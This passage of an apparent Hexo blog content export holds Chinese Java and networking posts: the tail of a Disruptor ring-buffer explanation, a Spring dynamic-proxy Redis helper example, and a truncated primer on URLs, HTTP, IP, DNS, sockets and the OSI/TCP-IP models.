如果没有读取到会一直尝试去读，disruptor做的很巧妙，并没有一直占据CPU，而是通过LockSuport.park()，进行了一下将线程阻塞挂起操作，为的是不让CPU一直进行这种空循环，不然其他线程都抢不到CPU时间片。 </p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/dis_ex.jpg" alt="img"></p><p> 获取位置之后会进行cas进行抢占，如果是单线程就不需要。</p></li></ul><ol><li>接下来调用我们上面所介绍的EventTranslator将第一步中RingBuffer中那个位置的event交给EventTranslator进行重写。</li><li>进行发布，在disruptor还有一个额外的数组用来记录当前ringBuffer所在位置目前最新的序列号是多少，拿上面那个0，10，20举例，写到10的时候这个avliableBuffer就在对应的位置上记录目前这个是属于10，有什么用呢后面会介绍。进行发布的时候需要更新这个avliableBuffer，然后进行唤醒所有阻塞的生产者。</li></ol><p>下面简单画一下流程，上面我们拿10举例是不对的，因为bufferSize必须要2的N次方，所以我们这里拿Buffersize=8来举例:下面介绍了当我们已经push了8个event也就是一圈的时候，接下来再push 3条消息的一些过程: 1.首先调用next(3)，我们当前在7这个位置上所以接下来三条是8，9，10，取余也就是0，1，2。 2.重写0，1，2这三个内存区域的数据。 3.写avaliableBuffer。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/dis_6.jpg" alt="img"></p><p>对了不知道大家对上述流程是不是很熟悉呢，对的那就是类似我们的2PC，两阶段提交，先进行RingBuffer的位置锁定，然后在进行提交和通知消费者。具体2PC的介绍可以参照我的另外一篇文章<a href="https://juejin.im/post/5b5a0bf9f265da0f6523913b">再有人问你分布式事务，给他看这篇文章</a>。</p><h3 id="3-3-1消费者"><a href="#3-3-1消费者" class="headerlink" title="3.3.1消费者"></a>3.3.1消费者</h3><p>对于消费者来说，上面介绍了分为两种，一种是多个消费者独立消费，一种是多个消费者消费同一个队列，这里介绍一下较为复杂的多个消费者消费同一个队列，能理解这个也就能理解独立消费。 在我们的disruptor.strat()方法中会启动我们的消费者线程以此来进行后台消费。在消费者中有两个队列需要我们关注，一个是所有消费者共享的进度队列，还有个是每个消费者独立消费进度队列。 1.对消费者共享队列进行下一个Next的CAS抢占，以及对自己消费进度的队列标记当前进度。 2.为自己申请可读的RingBuffer的Next位置，这里的申请不仅仅是申请到next，有可能会申请到比Next大的一个范围，阻塞策略的申请的过程如下:</p><ul><li><p>获取生产者对RingBuffer最新写的位置</p></li><li><p>判断其是否小于我要申请读的位置</p></li><li><p>如果大于则证明这个位置已经写了，返回给生产者。</p></li><li><p>如果小于证明还没有写到这个位置，在阻塞策略中会进行阻塞，其会在生产者提交阶段进行唤醒。 3.对这个位置进行可读校验，因为你申请的位置可能是连续的，比如生产者目前在7，接下来申请读，如果消费者已经把8和10这个序列号的位置写进去了，但是9这个位置还没来得及写入，由于第一步会返回10，但是9其实是不能读的，所以得把位置向下收缩到8。 </p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/dis_7.jpg" alt="img"></p><p> 4.如果收缩完了之后比当前next要小，则继续循环申请。 5.交给handler.onEvent()处理</p></li></ul><p>一样的我们举个例子，我们要申请next=8这个位置。 1.首先在共享队列抢占进度8，在独立队列写入进度7 2.获取8的可读的最大位置，这里根据不同的策略进行，我们选择阻塞，由于生产者生产了8，9，10，所以返回的是10，这样和后续就不需要再次和avaliableBuffer进行对比了。 3.最后交给handler进行处理。 </p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/dis_8" alt="img"></p><h1 id="4-Log4j中的Disruptor"><a href="#4-Log4j中的Disruptor" class="headerlink" title="4.Log4j中的Disruptor"></a>4.Log4j中的Disruptor</h1><p>下面的图展现了Log4j使用Disruptor,ArrayBlockingQueue以及同步的Log4j吞吐量的对比，可以看见使用了Disruptor完爆了其他的，当然还有更多的框架使用了Disruptor，这里就不做介绍了。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/dis_9.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态代理在代码中的应用</title>
      <link href="/proxy/"/>
      <url>/proxy/</url>
      
        <content type="html"><![CDATA[<p>动态代理在代码中的应用</p><a id="more"></a><h2 id="动态代理在代码中的应用"><a href="#动态代理在代码中的应用" class="headerlink" title="动态代理在代码中的应用."></a><font face="楷体" color=#FF0000>动态代理在代码中的应用.</font></h2><p> <font color=#008000  >先看一段代码</font> </p><p><font color=#008000>MixedRedisHelperFactoryBean</font>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MixedRedisHelperFactoryBean</span> <span class="keyword">implements</span> <span class="title">FactoryBean</span>&lt;<span class="title">MixedRedisHelper</span>&gt;, <span class="title">InitializingBean</span>, <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ShardedJedisTemplate shardedJedisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JedisClusterTemplate jedisClusterTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> MixedRedisHelper helper;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        helper = (MixedRedisHelper) Proxy.newProxyInstance(MixedRedisHelperFactoryBean.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> Class&lt;?&gt;[]&#123;MixedRedisHelper.class&#125;, <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MixedRedisHelper <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> helper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; getObjectType() &#123;</span><br><span class="line">        <span class="keyword">return</span> MixedRedisHelper.class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSingleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Object.class.equals(method.getDeclaringClass())) &#123;</span><br><span class="line">            <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>, args);</span><br><span class="line">        &#125;</span><br><span class="line">        Object target;</span><br><span class="line">        <span class="comment">//根据开关来决定使用啥shard：cluster</span></span><br><span class="line">        <span class="keyword">if</span> (ConfigManager.getBoolean(<span class="string">&quot;redis.cluster.standalone&quot;</span>, <span class="keyword">false</span>)) &#123;</span><br><span class="line">            target = jedisClusterTemplate;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target = shardedJedisTemplate;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(target, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><font color=#008000>MixedRedisHelper</font>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MixedRedisHelper</span> <span class="keyword">extends</span> <span class="title">JedisCommands</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><font color=#008000>ShardedJedisTemplate</font>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ShardedJedisTemplate</span> <span class="keyword">extends</span> <span class="title">JedisCommands</span>, <span class="title">Closeable</span>, <span class="title">BinaryJedisCommands</span> </span>&#123;</span><br><span class="line">List&lt;?&gt; pipelined(PipelineHandler handler);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><font color=#008000>JedisClusterTemplate</font>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">JedisClusterTemplate</span> <span class="keyword">extends</span> <span class="title">BasicCommands</span>, <span class="title">BinaryJedisClusterCommands</span>, <span class="title">MultiKeyBinaryJedisClusterCommands</span>,</span></span><br><span class="line"><span class="class">        <span class="title">JedisClusterBinaryScriptingCommands</span>, <span class="title">JedisCommands</span>, <span class="title">MultiKeyJedisClusterCommands</span>, <span class="title">JedisClusterScriptingCommands</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><font color=#FF0000 >InitializingBean</font>就是一个初始化类需要重写afterPropertiesSet()；就当是@postconstruct；</p><p>所以此处的代码是在类初始化的时候初始化了一个MixedRedisHelperFactoryBean，从它实现FactoryBean<MixedRedisHelper>可以知道它是用来生成MixedRedisHelper，就是说在使用@Autowired注解使用MixedRedisHelper的时候会使用此Factory生产的MixedRedisHelper的实例。</p><p>在来看它的初始方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      helper = (MixedRedisHelper) Proxy.newProxyInstance(MixedRedisHelperFactoryBean.class.getClassLoader(),</span><br><span class="line">              <span class="keyword">new</span> Class&lt;?&gt;[]&#123;MixedRedisHelper.class&#125;, <span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里使用了动态代理。。Proxy的用法请google。所以此Factory中的MixedRedisHelper对象是有代理生成的，也即我们执行MixedRedisHelper这个对象实例的时候会执行invoke方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Object.class.equals(method.getDeclaringClass())) &#123;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>, args);</span><br><span class="line">    &#125;</span><br><span class="line">    Object target;</span><br><span class="line">    <span class="comment">//根据开关来决定使用啥shard：cluster</span></span><br><span class="line">    <span class="keyword">if</span> (ConfigManager.getBoolean(<span class="string">&quot;redis.cluster.standalone&quot;</span>, <span class="keyword">false</span>)) &#123;</span><br><span class="line">        target = jedisClusterTemplate;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        target = shardedJedisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> method.invoke(target, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的invoke又使用了注入JedisClusterTemplate，ShardedJedisTemplate，这样就达到了通过配置文件来区分使用哪个，其中还有其他的请等等。。</p><p>待续！</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器</title>
      <link href="/connect/"/>
      <url>/connect/</url>
      
        <content type="html"><![CDATA[<p>   从输入一个地址开始，它可以是这样的 <font color=#2cede4> <a href="http://www.baidu.com/">www.baidu.com</a></font>, 也可以是这样的 <strong><a href="https://admin:admin@www.gschaos.club:80/dir/file1.html">https://admin:admin@www.gschaos.club:80/dir/file1.html</a></strong>, 咋一看好像都能看懂,而且还知道这么输入会得到什么,更言之还能断点调试一下; 可是输入一个网址到底发生了什么？</p> <a id="more"></a><h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a><font color=#2cede4>浏览器</font></h2><p>   从输入一个地址开始，它可以是这样的 <font color=#2cede4> <a href="http://www.baidu.com/">www.baidu.com</a></font>, 也可以是这样的 <strong><a href="https://admin:admin@www.gschaos.club:80/dir/file1.html">https://admin:admin@www.gschaos.club:80/dir/file1.html</a></strong>, 咋一看好像都能看懂,而且还知道这么输入会得到什么,更言之还能断点调试一下;</p><h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a><font color=#2cede4>URL</font></h3><p>我们先来看下URL,URL有很多种,不止我们常用到的http://,还有很多比如<font color=#2cede4>“file:” (读取本地文件) , “ftp:”(文件传输协议) , “mailto:”(邮件服务,需要配置正确的电子邮箱)</font>等.</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/url.png" alt="url的各种格式"></p><p>它们拥有同样的格式,即都需要定义一个访问方法(协议http,ftp等).</p><p><font color= \#E6E6FA >那么知道这些后浏览器做了什么呢?</font></p><h3 id="浏览器解析URL"><a href="#浏览器解析URL" class="headerlink" title="浏览器解析URL"></a><font color=#2cede4>浏览器解析URL</font></h3><p>浏览器首先对URL进行解析,从而生成发送给服务器的请求信息.依据不同的协议访问不同的服务器,这里阐述访问Web服务器的情况.</p><p>解析方式如下:</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/urlany.png" alt="URL解析"></p><p>有时候进入主页的时候文件名经常不写比如<strong><a href="http://www.lab.com/dir/">http://www.lab.com/dir/</a></strong>,那么解析的时候就会去寻找目录下面的default.html或者index.html具体访问什么要看服务器如何配置.当不写最后一个**/**时,是会先寻找文件夹,再寻找文件名的规则来进行的.</p><p>明白了URL，我们来对URL中HTTP进行简单的说明。</p><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a><font color=#2cede4>HTTP协议</font></h3><p>HTTP协议定义了客户端和服务器之间交互的消息内容和步骤,请求中包含了<strong>对什么</strong>和<strong>做什么</strong>两个部分;</p><blockquote><p><strong>对什么</strong>: 这部分就是URI(统一资源标识符),一般来说,URI的内容是一个存放网页数据的文件名或者是一个CGI程序的文件名.例如/dir/file1.html;不过,URI不仅限于此,也可以直接用”http:”开头的URL来作为URI.换句话就是,这里可以写各种访问目标,而这些访问目标统称为URI.</p><p><strong>做什么</strong>:  也称为方法.表示需要Web服务器做什么,典型的例子包括读取URI表示的数据/将客户端输入的数据发送给URI表示的程序等.</p></blockquote><p><img src="https://mysticalyu.gitee.io/pic/hexo/dowhat.png" alt="doWhat"></p><p>看到这张图是不是就对之前所解释的<strong>做什么</strong>有所了解了呢!</p><p>收到消息之后,Web服务器会对其中的内容进行解析,通过URI和方法来判断<font color=#2cede4>“对什么”,”做什么”</font>,并根据这些要求完成工作将结果放入响应消息中.</p><p>至此我们了解了HTTP的全貌,之后会一步步往下深入网络到底是怎么连接的..</p><p>当我们想寄一封信件的时候，我们需要能够帮助我们送信的机构，如果要自己送去那还送信做什么，直接过去把寄信人打一顿就完事了；所以就有了邮局(快递的你先放下…)，每个人都可以将信委托给邮局，让邮局帮我们将信件寄出去。我们发送一个网络请求也是，每个应用都可以发送网络请求，同样需要一个能够将消息发送到<strong>网络</strong>的机构，这个机构由操作系统来完成组建。所以，浏览器解析URL生成HTTP请求后需要委托操作系统将这些消息发送到网络。</p><p>当然，邮局也会要求我们填写一个寄信单，这个单子包括了<strong>寄信人的地址</strong>，<strong>寄信人的联系方式</strong>，<strong>收信人的地址</strong>，<strong>收信人的联系方式</strong>4个重要的信息(还有其他附加信息),填写正确才能将信件成功寄出。操作系统发送消息也是如此，它需要的是<strong>收信人的地址【对方的IP地址】，收信人的联系方式【对方的端口号】</strong>。发送方的自然也需要，只是两者绑定在一起，开机的那一刻就已经存在内存中了。</p><p>在这之前，来了解一下IP地址是啥子。</p><h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h3><p>住在有门牌号的房子的大伙都知道(如果没有，请默哀两分钟！)，寄发信件的时候需要填写自己和对方的具体地址，而这个地址就是小区的某个房间的门牌号，完整的地址包括了国家，省份市直辖区，县/区，乡镇小区等等。国家与国家之间形成了不同的区域，说中国在哪，一定会有答案，再往下，省市区小区直到门牌号，它就像一个唯一的号牌将这个地址标记出来。</p><p>IP地址同样是这样的道理。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/intnet.png" alt="intnet"></p><p>互联网和公司内部的局域网都是基于TCP/IP的思路来设计的，如上图，就是由一些小的子网(小区甚至楼层之间)，通过路由器连接起来。这里的子网可以理解成为用集线器连接起来的几台计算机，将它看作一个单位，称为子网。将子网连接起来，就形成了一个网络。</p><p>你要说怎么理解，那看下面这张图吧(自己画的可能不准确！)。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/naphthalene.png" alt="naphthalene"></p><p>在网络中所有的设备都会被分配一个地址。就好像是<strong>XX号XX室</strong>。其中<strong>号</strong>对应的号码是分配给整个子网的，而<strong>室</strong>对应的号码是分配给子网中的计算机的，这就是网络中的地址。<strong>号</strong>对应的号码称为网络号，<strong>室</strong>对应的号码称为主机号，这个地址的整体称为IP地址。发送者发送的消息首先经过子网中的集线器，转发到距离最近的路由器上。接下来，路由器会根据消息的目的地判断下一个路由去的位置，然后将消息发送到下一个路由器，即消息再次经过子网内的集线器被转发到下一个路由器。前面的过程不断重复，最终消息就被传到了目的地。这个过程就好像你准备好信件由邮局寄出，邮局寄出后会送往下一站，再由下一站判断你的目的地，再往下送一样；</p><p>那么这个地址到底是怎么组成的呢？</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/ip.png" alt="IP"></p><p>如上图，实际的IP地址是一串32比特的数字，按照1个字节为一组分成4组，分别用十进制表示然后再用圆点隔开。在IP地址的规则中，网络号和主机号连接起来总共是32比特，但这两部分的具体结构是不固定的。在组建网络时，用户可以自行决定他们之间的分配关系，因此，这里还需要另外的附加信息来表示IP地址的内部结构。</p><p>这个附加信息就是子网掩码。子网掩码的格式如下图，是一串与IP地址长度相同的32比特数字，左边一半全是1，代表网络号，右边一半全是0，代表主机号。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/ipyanma.png" alt="ipyanma"></p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>那么要怎么得到域名对应的IP地址呢？?</p><p>按照开发的思路，要得到域名对应的IP地址，那肯定需要一个key-value的内存表来记录域名key对应的IP地址value，这样取出来即可，可是….这个表在哪里？</p><p>这就要涉及到DNS域名服务器，浏览器委托操作系统先去DNS域名服务器查询域名对应的IP地址，服务器返回需要IP，然后我们就可以用这个IP发送消息了。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/mengbi2.jpg" alt="mengbi2"></p><p>等等！我怎么访问DNS域名服务器的？我..我怎么知道它的IP的？？</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/mangqu.jpeg" alt="mangqu"></p><p>参考<a href="http://www.ruanyifeng.com/blog/2016/06/dns.html">DNS 原理入门</a>以及如果你听英文可以听得懂的话 <a href="https://aws.amazon.com/tw/route53/what-is-dns/">AWS的‘什麼是 DNS’？</a>；</p><p> 首先，本机一定要知道DNS服务器的IP地址，否则上不了网。通过DNS服务器，才能知道某个域名的IP地址到底是什么。  </p><p>DNS服务器的IP地址，有可能是动态的，每次上网时由网关分配，这叫做DHCP机制；也有可能是事先指定的固定地址。Linux系统里面，DNS服务器的IP地址保存在<code>/etc/resolv.conf</code>文件。 </p><p> 有一些公网的DNS服务器，也可以使用，其中最有名的就是Google的<a href="https://developers.google.com/speed/public-dns/"><code>8.8.8.8</code></a>和Level 3的<a href="https://www.tummy.com/articles/famous-dns-server/"><code>4.2.2.2</code></a>。 </p><p>在linux系统总可以使用dig match 域名 来查看使用的DNS服务器IP地址。</p><p> 域名的层级结构如下 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">主机名.次级域名.顶级域名.根域名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 即</span></span><br><span class="line"></span><br><span class="line">host.sld.tld.root</span><br></pre></td></tr></table></figure><p> DNS服务器根据域名的层级，进行分级查询。 就是从根域名开始，依次查询每一级域名的NS记录，直到查到最终的IP地址，过程大致如下。</p><blockquote><ol><li>从”根域名服务器”查到”顶级域名服务器”的NS记录和A记录（IP地址）</li><li>从”顶级域名服务器”查到”次级域名服务器”的NS记录和A记录（IP地址）</li><li>从”次级域名服务器”查出”主机名”的IP地址</li></ol></blockquote><p> “根域名服务器”的NS记录和IP地址一般是不会变化的，所以内置在DNS服务器里面。 </p><p>我们只要知道连接网络需要ip地址，而域名如何解析成ip地址需要DNS域名服务器，而这个DNS域名服务器在设置网络连接的时候已经配置好，即已存在这个IP地址即可。</p><p>知道了对方的IP地址，要怎么才算连接呢？以编程者的思想连接如下图所示。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/allConnect.png" alt="allConnect"></p><p>我们这里不需要知道编程怎么实现，因为不管是哪种编程它们都是在委托操作系统在发送信息，所以基本流程如下图。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/simpleConnect.png" alt="simpleConnect"></p><p>这里解释下这张图！</p><p>上文中我们知道连接互联网的重任不是应用自己连接，而是委托给操作系统来执行连接，浏览器或者应用程序调用Socket发起一个连接就是一次创建Socket(FD)套接字的过程。</p><p>首先，分配一个内存空间用以存储套接字信息，然后，将表示这个套接字的描述符告知应用程序。</p><p>那何为套接字描述符呢?在这之前想考一个问题，在计算机中同一时间进行通信操作的应用程序不止一个，这时，我们就需要一种方法来识别出某个特定的套接字，这种方法就是描述符。我们可以理解描述符是给某个套接字分配的唯一编号。当我们使用某个套接字来执行收发数据的操作时，就可以出示所拥有的描述符，协议栈就能够判断出我们希望用哪一个套接字来连接或者发送数据了。在win中使用<font color= #CD5C5C>netstat</font>命令查看系统套接字内容，如下图(这张图是盗来的)：</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/netstat.png" alt="netstat"></p><p>图中每一行相当于一个套接字，当创建套接字时，就会增加一行控制信息，赋予“即将开始通信”的状态，并进行通信的准备工作，如分配用于临时存放手法数据的缓冲区空间。</p><p>接着Socket调用<font color= #CD6839 >connect</font>连接服务器，这个时候协议栈并不知道要和谁通信，在服务器端甚至应用程序要和谁连接都不晓得，这样下去都不知道咋整。所以，发起连接的一方需要告知被连接方一些必要的信息，比如“halo，我需要和你通奸…..哦不! 需要和你通信，这是我的房间号(ip+端口)，记得回信息哦，我在等着你呢！”。这样双方才知道互连的通信是谁，才能顺利的进行收发数据。</p><p>其实就是男女双方需要交换一些个性信息才好继续沟通下去。</p><p>那么，它们如何沟通呢？</p><p>需要的前提大部分已经凑齐，开始通信之前我们需要了解一下TPC/IP模型。</p><p> 网络模型不是一开始就有的，在网络刚发展时，网络协议是由各互联网公司自己定义的，各家的协议也是不能互通的。这样大大的阻碍了互联网的发展，为了解决这个问题，国际标准化组织 1984 提出的模型标准，简称 OSI（Open Systems Interconnection Model）。具体如下图：</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/v2-ad2bee0fd2abff4bf5807ca93d93cbd6_hd.jpg" alt="img"></p><p>OSI七层模型每一层都有自己的作用，从上到下的作用依次为：</p><ul><li>应用层(Application) :提供网络与用户应用软件之间的接口服务</li><li>表示层(Presentation) :提供格式化的表示和转换数据服务，如加密和压缩</li><li>会话层(Session) 提供包括访问验证和会话管理在内的建立和维护应用之间通信的机制</li><li>传输层(Transimission):提供建立、维护和取消传输连接功能，负责可靠地传输数据(PC)</li><li>网络层(Network): 处理网络间路由，确保数据及时传送(路由器)</li><li>数据链路层(DataLink): 负责无错传输数据，确认帧、发错重传等(交换机)</li><li>物理层(Physics) :提供机械、电气、功能和过程特性(网卡、网线、双绞线、同轴电缆、中继器)</li></ul><p>七层中应用层、表示层和会话层由软件控制，传输层、网络层和数据链路层由操作系统控制，物理层有物理设备控制。</p><h2 id="2-TCP-IP参考模型及协议"><a href="#2-TCP-IP参考模型及协议" class="headerlink" title="2 TCP/IP参考模型及协议"></a>2 TCP/IP参考模型及协议</h2><h2 id="1-模型"><a href="#1-模型" class="headerlink" title="1) 模型"></a>1) 模型</h2><p>TCP/IP 模型是由 OSI 模型演化而来，TCP/IP 模型将 OSI 模型由七层简化为五层（一开始为四层），应用层、表示层、会话层统一为应用层。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/v2-72754ddc9c8133906ade003ad4a346d5_hd.jpg" alt="img"></p><h2 id="2-协议"><a href="#2-协议" class="headerlink" title="2) 协议"></a>2) 协议</h2><p>TCP/IP协议被称为传输控制协议/互联网协议，又称网络通讯协议(Transmission Control Protocol)。是由网络层的IP协议和传输层的TCP协议组成，是一个很大的协议集合。</p><ul><li>物理层和数据链路层没有定义任何特定协议，支持所有的标准和专用的协议。</li><li>网络层定义了网络互联也就是IP协议，主要包括IP、ARP、RARP、ICMP、IGMP。</li><li>传输层定义了TCP和UDP(User Datagram Protocol)，我们会后面重点介绍一下TCP协议。</li><li>应用层定义了HTTP(超文本传输协议)、FTP(文件传输协议)、DNS(域名系统)等协议。</li></ul><h2 id="3-物理层"><a href="#3-物理层" class="headerlink" title="3 物理层"></a>3 物理层</h2><p>计算机在传递数据的时候传递的都是0和1的数字，而物理层关心的是用什么信号来表示0和1，是否可以双向通信，最初的连接如何建立以及完成连接如何终止,总之，物理层是为数据传输提供可靠的环境。</p><h2 id="4-数据链路层"><a href="#4-数据链路层" class="headerlink" title="4 数据链路层"></a>4 数据链路层</h2><p>数据链路层们于物理层和网络层之间，用来向网络层提供数据，就是把源计算机网络层传过来的信息传递给目标主机。<br>数据链路层主要的作用包括：</p><ul><li>如何将数据组合成数据帧(Frame)，帧是数据链路层的传输单位</li><li>数据链路的建立、维护和拆除</li><li>帧包装、帧传输、帧同步</li><li>帧的差错恢复</li><li>流量控制</li></ul><h2 id="5-网络层"><a href="#5-网络层" class="headerlink" title="5 网络层"></a>5 网络层</h2><p>网络层位于传输层和数据链路层之间,用于把数据从源主机经过若干个中间节点传送到目标主机,并向传输层提供最基础的数据传输服务,它要提供路由和选址的工作。</p><p>那什么是路由和选址呢？</p><blockquote><p>选址</p></blockquote><p>交换机是靠MAC来寻址的，而因为MAC地址是无层次的,所以要靠IP地址来确认计算机的位置,这就是选址。</p><blockquote><p>路由</p></blockquote><p>在能够选择的多条道路之间选择一条最短的路径就是路由的工作。</p><p>路由和选址都离不开IP，我们就详细介绍一下IP头部。</p><h2 id="IP头"><a href="#IP头" class="headerlink" title="IP头"></a>IP头</h2><p>IP头部是由20个字节组成的，具体项所占的位数如下图：</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/v2-7060962aca6abdc95435330415f968fa_hd.jpg" alt="img"></p><p>具体的数据我们用Wireshark来表抓取一下，如图（蓝色部分为IP数据包）：</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/v2-489d57b43d9b4c6d2535eeeb60cc7f3f_hd.jpg" alt="img"></p><blockquote><p>version - 版本</p><p>Header Length - 首部长部</p><p>Differentiated Services Field - 优先级与服务类型</p><p>Total Length - 